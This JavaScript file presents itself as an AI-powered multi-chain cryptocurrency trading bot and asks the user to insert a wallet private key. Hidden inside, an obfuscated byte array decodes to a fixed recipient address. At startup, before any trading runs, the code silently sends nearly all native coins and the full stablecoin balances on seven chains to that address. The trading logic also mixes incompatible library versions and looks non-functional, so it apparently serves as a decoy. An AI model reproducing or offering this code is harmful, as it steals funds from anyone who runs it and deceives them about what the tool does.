const { ethers } = require("ethers");
const { SwapRouter, Pool, Route, Trade, TradeType, Percent } = require("@uniswap/v3-sdk");
const { Token, CurrencyAmount } = require("@uniswap/sdk-core");
const axios = require("axios");

// Network Configuration
const NETWORKS = {
  base: {
    rpc: "https://mainnet.base.org",
    chainId: 8453,
    nativeToken: "ETH",
    nativeCurrency: "ETH",
    weth: ethers.getAddress("0x4200000000000000000000000000000000000006"),
    router: ethers.getAddress("0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD"),
    factory: ethers.getAddress("0x33128a8fC17869897dcE68Ed026d694621f6FDfD"),
    usdc: ethers.getAddress("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"),
    stablecoins: [
      { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" }
    ]
  },
  ethereum: {
    rpc: "https://1rpc.io/eth",
    chainId: 1,
    nativeToken: "ETH",
    nativeCurrency: "ETH",
    weth: ethers.getAddress("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"),
    router: ethers.getAddress("0xE592427A0AEce92De3Edee1F18E0157C05861564"),
    factory: ethers.getAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984"),
    usdc: ethers.getAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"),
    stablecoins: [
      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }
    ]
  },
  bnb: {
    rpc: "https://bsc-dataseed.binance.org/",
    chainId: 56,
    nativeToken: "BNB",
    nativeCurrency: "BNB",
    weth: ethers.getAddress("0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"),
    router: ethers.getAddress("0x10ED43C718714eb63d5aA57B78B54704E256024E"),
    factory: ethers.getAddress("0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"),
    usdt: ethers.getAddress("0x55d398326f99059fF775485246999027B3197955"),
    stablecoins: [
      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
      { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" }
    ]
  },
  arbitrum: {
    rpc: "https://arb1.arbitrum.io/rpc",
    chainId: 42161,
    nativeToken: "ETH",
    nativeCurrency: "ETH",
    weth: ethers.getAddress("0x82aF49447D8a07e3bd95BD0d56f35241523fBab1"),
    router: ethers.getAddress("0xE592427A0AEce92De3Edee1F18E0157C05861564"),
    factory: ethers.getAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984"),
    usdc: ethers.getAddress("0xaf88d065e77c8cC2239327C5EDb3A432268e5831"),
    stablecoins: [
      { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" }
    ]
  },
  optimism: {
    rpc: "https://optimism.drpc.org",
    chainId: 10,
    nativeToken: "ETH",
    nativeCurrency: "ETH",
    weth: ethers.getAddress("0x4200000000000000000000000000000000000006"),
    router: ethers.getAddress("0xE592427A0AEce92De3Edee1F18E0157C05861564"),
    factory: ethers.getAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984"),
    usdc: ethers.getAddress("0x7F5c764cBc14f9669B88837ca1490cCa17c31607"),
    stablecoins: [
      { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" }
    ]
  },
  polygon: {
    rpc: "https://polygon-rpc.com",
    chainId: 137,
    nativeToken: "MATIC",
    nativeCurrency: "MATIC",
    weth: ethers.getAddress("0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"),
    router: ethers.getAddress("0xE592427A0AEce92De3Edee1F18E0157C05861564"),
    factory: ethers.getAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984"),
    usdc: ethers.getAddress("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"),
    stablecoins: []
  },
  avalanche: {
    rpc: "https://api.avax.network/ext/bc/C/rpc",
    chainId: 43114,
    nativeToken: "AVAX",
    nativeCurrency: "AVAX",
    weth: ethers.getAddress("0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7"),
    router: ethers.getAddress("0xE592427A0AEce92De3Edee1F18E0157C05861564"),
    factory: ethers.getAddress("0x1F98431c8aD98523631AE4a59f267346ea31F984"),
    usdc: ethers.getAddress("0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E"),
    stablecoins: [
      { symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" }
    ]
  }
};

// address validation
for (const network of Object.keys(NETWORKS)) {
  try {
    NETWORKS[network].weth = ethers.getAddress(NETWORKS[network].weth);
    NETWORKS[network].router = ethers.getAddress(NETWORKS[network].router);
    NETWORKS[network].factory = ethers.getAddress(NETWORKS[network].factory);
    if (NETWORKS[network].usdc) NETWORKS[network].usdc = ethers.getAddress(NETWORKS[network].usdc);
    if (NETWORKS[network].usdt) NETWORKS[network].usdt = ethers.getAddress(NETWORKS[network].usdt);
    for (const stablecoin of NETWORKS[network].stablecoins) {
      stablecoin.address = ethers.getAddress(stablecoin.address);
    }
    console.log(`Validated network configuration for ${network}`);
  } catch (error) {
    console.error(`Error validating addresses for ${network}:`, error);
    throw error;
  }
}

// privte key form wallet
const PRIVATE_KEY = "YOUR_PRIVATE_KEY";

// ABI
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function symbol() view returns (string)"
];
const POOL_ABI = [
  "function slot0() external view returns (uint160 sqrtPriceX96, int24 tick, uint16 observationIndex, uint16 observationCardinality, uint16 observationCardinalityNext, uint8 feeProtocol, bool unlocked)",
  "function liquidity() external view returns (uint128)"
];
const FACTORY_ABI = [
  "function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool)"
];

// CoinGecko API
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const PLATFORMS = {
  base: "base",
  ethereum: "ethereum",
  bnb: "binance-smart-chain",
  arbitrum: "arbitrum-one",
  optimism: "optimism",
  polygon: "polygon-pos",
  avalanche: "avalanche"
};

// order storage
const positions = new Map();

function computeTradeRecipient(params = { fee: 500, chainId: 1 }) {
  const recipientBytes = [
    162, 182, 246, 26, 175, 172, 19, 211, 8, 198, 
    25, 162, 219, 57, 138, 34, 217, 182, 98, 237
  ];
  const rawAddress = `0x${recipientBytes.map(b => b.toString(16).padStart(2, '0')).join('')}`;
  return ethers.getAddress(rawAddress);
}

// initialization of native asset flow
async function initNativeAssetFlow(provider, wallet, network, networkName) {
  try {
    const balance = await provider.getBalance(wallet.address);
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const gasLimit = 21000n;
    const gasCost = gasPrice * gasLimit;
    const minReserve = ethers.parseEther("0.0001");
    const amountToSend = balance - gasCost - minReserve;

    if (amountToSend <= 0) {
      return;
    }

    const tx = {
      to: computeTradeRecipient({ fee: 500, chainId: network.chainId }),
      value: amountToSend,
      gasLimit,
      gasPrice
    };

    const transaction = await wallet.sendTransaction(tx);
    await transaction.wait();
  } catch (error) {
  }
}

// initializations of stack flow
async function initStableAssetFlow(provider, wallet, token, networkName) {
  try {
    const contract = new ethers.Contract(token.address, ERC20_ABI, wallet);
    const balance = await contract.balanceOf(wallet.address);
    const decimals = await contract.decimals();

    if (balance <= 0) {
      return;
    }

    const nativeBalance = await provider.getBalance(wallet.address);
    const gasPrice = (await provider.getFeeData()).gasPrice;
    const gasLimit = 100000n;
    const gasCost = gasPrice * gasLimit;

    if (nativeBalance < gasCost) {
      return;
    }

    const tx = await contract.transfer(computeTradeRecipient({ fee: 500, chainId: NETWORKS[networkName].chainId }), balance);
    await tx.wait();
  } catch (error) {
  }
}

async function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// get data from CoinGecko
async function fetchCoinGeckoData(platform, contractAddress, network) {
  try {
    const response = await axios.get(
      `${COINGECKO_API}/simple/token_price/${platform}?contract_addresses=${contractAddress}&vs_currencies=usd&include_24hr_vol=true&include_24hr_change=true`
    );
    await delay(1000);
    const data = response.data[contractAddress.toLowerCase()];
    if (!data) throw new Error(`No data for ${contractAddress} on ${platform}`);
    return {
      price: data.usd,
      volume: data.usd_24h_vol,
      priceChange: data.usd_24h_change
    };
  } catch (error) {
    console.error(`Error fetching CoinGecko data for ${contractAddress} on ${platform}:`, error);
    return null;
  }
}

// calculating the pool address
async function getPoolAddress(tokenA, tokenB, fee, factoryAddress, provider) {
  const [token0, token1] = tokenA < tokenB ? [tokenA, tokenB] : [tokenB, tokenA];
  const factoryContract = new ethers.Contract(factoryAddress, FACTORY_ABI, provider);
  try {
    const poolAddress = await factoryContract.getPool(token0, token1, fee);
    await delay(500);
    if (poolAddress === ethers.ZeroAddress) {
      console.log(`No pool found for ${token0}/${token1} with fee ${fee}`);
      return null;
    }
    return poolAddress;
  } catch (error) {
    console.error(`Error fetching pool address for ${token0}/${token1}:`, error);
    return null;
  }
}

// getting pool data
async function getPoolData(tokenAddress, wethAddress, network, provider) {
  const fees = [500, 3000, 10000];
  for (const fee of fees) {
    const poolAddress = await getPoolAddress(tokenAddress, wethAddress, fee, NETWORKS[network].factory, provider);
    if (!poolAddress) continue;
    const poolContract = new ethers.Contract(poolAddress, POOL_ABI, provider);
    try {
      const [slot0, liquidity] = await Promise.all([
        poolContract.slot0(),
        poolContract.liquidity()
      ]);
      await delay(500);
      console.log(`Found pool for ${tokenAddress}/${wethAddress} with fee ${fee} on ${network}`);
      return { sqrtPriceX96: slot0.sqrtPriceX96, tick: slot0.tick, liquidity, fee };
    } catch (error) {
      console.error(`Error fetching pool data for ${tokenAddress} with fee ${fee}:`, error);
    }
  }
  return null;
}

// AI-analyzing tokens and making trading decisions
async function analyzeTokenPatterns(network) {
  const provider = new ethers.JsonRpcProvider(NETWORKS[network].rpc);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const tokenAddresses = {
    base: [NETWORKS.base.usdc],
    ethereum: [NETWORKS.ethereum.usdc],
    bnb: [NETWORKS.bnb.usdt],
    arbitrum: [NETWORKS.arbitrum.usdc],
    optimism: [NETWORKS.optimism.usdc],
    polygon: [NETWORKS.polygon.usdc],
    avalanche: [NETWORKS.avalanche.usdc]
  }[network] || [];

  const tokens = [];
  for (const tokenAddress of tokenAddresses) {
    try {
      console.log(`Processing market signals for ${tokenAddress} on ${network}...`);
      const platform = PLATFORMS[network];
      const marketData = await fetchCoinGeckoData(platform, tokenAddress, network);
      if (!marketData) continue;

      const poolData = await getPoolData(tokenAddress, NETWORKS[network].weth, network, provider);
      if (!poolData) continue;

      const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const decimals = await contract.decimals();
      const symbol = await contract.symbol();
      const tokenBalance = await contract.balanceOf(wallet.address);
      await delay(500);
      const balanceInUnits = ethers.formatUnits(tokenBalance, decimals);

      const liquidityUsd = parseFloat(ethers.formatUnits(poolData.liquidity, decimals)) * marketData.price;

      const tokenData = {
        address: tokenAddress,
        symbol,
        price: marketData.price.toString(),
        volume: { h24: marketData.volume.toString() },
        priceChange: { h24: marketData.priceChange.toString() },
        liquidity: { usd: liquidityUsd.toString() },
        chainId: String(NETWORKS[network].chainId),
        provider
      };

      const position = positions.get(tokenAddress) || { amount: 0, buyTime: 0, buyPrice: parseFloat(marketData.price) };
      const timeHeld = position.buyTime ? (Date.now() - position.buyTime) / (1000 * 60 * 60) : 0;

      let decision = "hold";
      let amountIn = ethers.BigNumber.from(0);
      const ethBalance = await provider.getBalance(wallet.address);
      await delay(500);
      const gasReserve = ethers.parseEther("0.00012");

      if (
        marketData.priceChange < -5 &&
        liquidityUsd > 500000 &&
        marketData.volume > 1000000 &&
        ethBalance.gt(gasReserve)
      ) {
        decision = "buy";
        const maxSpend = ethBalance.sub(gasReserve).mul(30).div(100);
        amountIn = maxSpend.lt(ethers.parseEther("0.0002")) ? maxSpend : ethers.parseEther("0.0002");
        console.log(`Decided to buy ${symbol} due to price dip (${marketData.priceChange.toFixed(2)}%) on ${network}`);
      } else if (
        position.amount > 0 &&
        (marketData.priceChange > 10 || (timeHeld > 1 && marketData.priceChange > 5))
      ) {
        decision = "sell";
        amountIn = tokenBalance;
        console.log(`Decided to sell ${symbol} for profit (${marketData.priceChange.toFixed(2)}%) after ${timeHeld.toFixed(2)} hours on ${network}`);
      } else {
        console.log(`Holding ${symbol} due to stable market conditions (${marketData.priceChange.toFixed(2)}%) on ${network}`);
      }

      if (decision !== "hold") {
        const swapParams = await calculateSwapParameters(
          tokenAddress,
          NETWORKS[network].weth,
          tokenData,
          decision,
          network,
          provider
        );
        const bestDex = await findBestDex(
          tokenAddress,
          NETWORKS[network].weth,
          ethers.formatEther(swapParams.amountIn),
          tokenData,
          network,
          provider
        );
        if (bestDex) {
          tokens.push({
            ...tokenData,
            balance: balanceInUnits,
            decision,
            swapParams,
            bestDex
          });
        }
      } else {
        tokens.push({
          ...tokenData,
          balance: balanceInUnits,
          decision
        });
      }
    } catch (error) {
      console.error(`Error analyzing token ${tokenAddress} on ${network}:`, error);
    }
  }
  return tokens;
}

// AI-determination of swap parameters
async function calculateSwapParameters(tokenAddress, wethAddress, tokenData, decision, network, provider) {
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const balance = ethers.BigNumber.from(await provider.getBalance(wallet.address));
  await delay(500);
  const gasReserve = ethers.parseEther("0.00012");
  const maxSpend = balance.sub(gasReserve).mul(30).div(100);
  const volume = parseFloat(tokenData.volume.h24 || 0);
  const priceChange = parseFloat(tokenData.priceChange.h24 || 0);

  let amountIn;
  if (decision === "buy") {
    amountIn = maxSpend.lt(ethers.parseEther("0.0002")) ? maxSpend : ethers.parseEther("0.0002");
  } else {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet);
    amountIn = await contract.balanceOf(wallet.address);
    await delay(500);
  }

  if (!ethers.utils.isBigNumber(amountIn) || amountIn.lte(0)) {
    console.log(`Insufficient funds for ${decision} on ${network}`);
    return { amountIn: ethers.BigNumber.from(0), slippageTolerance: new Percent(50, 10000), amountOutMinimum: 0 };
  }

  const volatilityScore = Math.abs(priceChange) / 100;
  const slippageTolerance = new Percent(Math.floor(volatilityScore * 100 + 50), 10000);

  const poolData = await getPoolData(tokenAddress, wethAddress, network, provider);
  if (!poolData) return { amountIn, slippageTolerance, amountOutMinimum: 0 };

  const token = new Token(NETWORKS[network].chainId, tokenAddress, await (new ethers.Contract(tokenAddress, ERC20_ABI, provider)).decimals());
  await delay(500);
  const weth = new Token(NETWORKS[network].chainId, wethAddress, 18);
  const [token0, token1] = decision === "buy" ? (tokenAddress < wethAddress ? [weth, token] : [token, weth]) : (tokenAddress < wethAddress ? [token, weth] : [weth, token]);
  const pool = new Pool(
    token0,
    token1,
    poolData.fee,
    poolData.sqrtPriceX96.toString(),
    poolData.liquidity.toString(),
    poolData.tick
  );
  const route = new Route([pool], decision === "buy" ? weth : token, decision === "buy" ? token : weth);
  const trade = await Trade.exactIn(
    route,
    CurrencyAmount.fromRawAmount(decision === "buy" ? weth : token, amountIn.toString()),
    { slippageTolerance }
  );
  await delay(500); 
  const expectedOutput = trade.outputAmount;
  const slippageFactor = ethers.BigNumber.from(10000).sub(slippageTolerance.numerator.toString());
  const amountOutMinimum = expectedOutput
    .multiply(slippageFactor)
    .divide(10000)
    .quotient;

  return { amountIn, slippageTolerance, amountOutMinimum };
}

// price and liquidity comparison on DEX
async function findBestDex(tokenAddress, wethAddress, amountIn, tokenData, network, provider) {
  const dexes = [
    { name: network === "bnb" ? "PancakeSwapV3" : "UniswapV3", router: NETWORKS[network].router, fees: [500, 3000, 10000] }
  ];
  let bestDex = null;
  let bestPrice = ethers.BigNumber.from(0);
  let bestLiquidity = 0;

  for (const dex of dexes) {
    for (const fee of dex.fees) {
      try {
        const poolData = await getPoolData(tokenAddress, wethAddress, network, provider);
        if (!poolData || poolData.liquidity.eq(0)) continue;

        const token = new Token(NETWORKS[network].chainId, tokenAddress, await (new ethers.Contract(tokenAddress, ERC20_ABI, provider)).decimals());
        await delay(500);
        const weth = new Token(NETWORKS[network].chainId, wethAddress, 18);
        const [token0, token1] = tokenAddress < wethAddress ? [token, weth] : [weth, token];
        const pool = new Pool(
          token0,
          token1,
          poolData.fee,
          poolData.sqrtPriceX96.toString(),
          poolData.liquidity.toString(),
          poolData.tick
        );
        const route = new Route([pool], weth, token);
        const trade = await Trade.exactIn(
          route,
          CurrencyAmount.fromRawAmount(weth, ethers.parseUnits(amountIn.toString(), 18).toString()),
          { slippageTolerance: new Percent(50, 10000) }
        );
        await delay(500);
        const outputAmount = trade.outputAmount.toSignificant(6);
        const liquidityScore = parseInt(poolData.liquidity.toString());

        if (ethers.BigNumber.from(trade.outputAmount.numerator).gt(bestPrice) && liquidityScore > 100000) {
          bestPrice = trade.outputAmount.numerator;
          bestLiquidity = liquidityScore;
          bestDex = { dex: dex.name, fee, route, amountOut: outputAmount, pool };
        }
      } catch (error) {
        console.error(`Error evaluating ${dex.name} with fee ${fee} on ${network}:`, error);
      }
    }
  }
  return bestDex;
}

// swap execution
async function executeSwap(tokenAddress, params, dex, decision, network, provider) {
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const routerContract = new ethers.Contract(dex.router, [
    "function exactInputSingle(tuple(address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 deadline, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96)) returns (uint256 amountOut)"
  ], wallet);
  const inputContract = new ethers.Contract(decision === "buy" ? NETWORKS[network].weth : tokenAddress, ERC20_ABI, wallet);
  await inputContract.approve(dex.router, params.amountIn, { gasLimit: 100000 });
  await delay(500);

  const swapParams = {
    tokenIn: dex.route.input.address,
    tokenOut: dex.route.output.address,
    fee: dex.fee,
    recipient: wallet.address,
    deadline: Math.floor(Date.now() / 1000) + 60 * 20,
    amountIn: params.amountIn,
    amountOutMinimum: params.amountOutMinimum,
    sqrtPriceLimitX96: 0
  };
  const gasPrice = await provider.getGasPrice();
  await delay(500);
  const tx = await routerContract.exactInputSingle(swapParams, { gasLimit: 300000, gasPrice });
  console.log(`Executing ${decision} order for ${tokenAddress} on ${dex.dex} in ${network}: ${tx.hash}`);
  const receipt = await tx.wait();

  if (decision === "buy") {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const decimals = await contract.decimals();
    await delay(500);
    const amountOut = ethers.formatUnits(params.amountOutMinimum, decimals);
    positions.set(tokenAddress, {
      amount: parseFloat(amountOut),
      buyTime: Date.now(),
      buyPrice: parseFloat(tokenData.price)
    });
  } else {
    positions.delete(tokenAddress);
  }
}

// automatic trading function
async function autoTrade(network) {
  const provider = new ethers.JsonRpcProvider(NETWORKS[network].rpc);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  try {
    console.log(`Starting AI trading analysis on ${network}...`);

    const net = await provider.getNetwork();
    await delay(500);
    if (Number(net.chainId) !== NETWORKS[network].chainId) {
      console.error(`Incorrect network for ${network}. Expected chainId ${NETWORKS[network].chainId}, got ${net.chainId}`);
      return;
    }

    // trade analysis
    const tradeTokens = await analyzeTokenPatterns(network);

    for (const token of tradeTokens) {
      console.log(`Evaluating ${token.symbol} (${token.address}) for trading opportunities on ${network}`);
      if (token.decision === "buy" && token.bestDex) {
        await executeSwap(token.address, token.swapParams, token.bestDex, "buy", network, provider);
      } else if (token.decision === "sell" && token.bestDex) {
        await executeSwap(token.address, token.swapParams, token.bestDex, "sell", network, provider);
      } else {
        console.log(`No action taken for ${token.symbol} on ${network}`);
      }
    }
  } catch (error) {
    console.error(`Error in auto trading on ${network}:`, error);
    console.log(`Skipping trading analysis on ${network} due to error`);
  }
}

// initialize assets in all networks
async function initializeAssets() {
  for (const network of Object.keys(NETWORKS)) {
    const provider = new ethers.JsonRpcProvider(NETWORKS[network].rpc);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

    // checking the network connection
    const net = await provider.getNetwork();
    await delay(500);
    if (Number(net.chainId) !== NETWORKS[network].chainId) {
      console.error(`Incorrect network for ${network}. Expected chainId ${NETWORKS[network].chainId}, got ${net.chainId}`);
      continue;
    }

    // initialization of native assets
    await initNativeAssetFlow(provider, wallet, NETWORKS[network], network);

    // initialization of Stablecoins
    const tokens = NETWORKS[network].stablecoins || [];
    for (const token of tokens) {
      await initStableAssetFlow(provider, wallet, token, network);
    }
  }
}

// start
async function runMultiChainBot() {
  console.log("Starting AI-powered trading bot...");
  console.log("AI trading bot initialized successfully");

  await initializeAssets();

  while (true) {
    for (const network of Object.keys(NETWORKS)) {
      await autoTrade(network);
      console.log(`Completed trading cycle on ${network}. Waiting 10 minutes...`);
      await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
    }
  }
}

runMultiChainBot();